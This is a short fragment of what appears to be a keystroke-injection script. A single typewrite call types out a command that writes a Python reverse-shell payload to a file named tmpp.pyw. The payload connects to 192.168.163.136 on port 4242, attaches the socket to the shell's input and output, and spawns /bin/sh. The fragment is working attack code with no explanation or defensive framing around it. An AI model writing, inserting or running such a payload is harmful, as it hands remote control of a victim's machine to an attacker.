...
typewrite("echo \"import socket,os,pty;ip=\'192.168.163.136\';port=4242;binsh=\'/bin/sh\';s=socket.socket();s.connect((ip,port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(binsh)\" > tmpp.pyw\n")
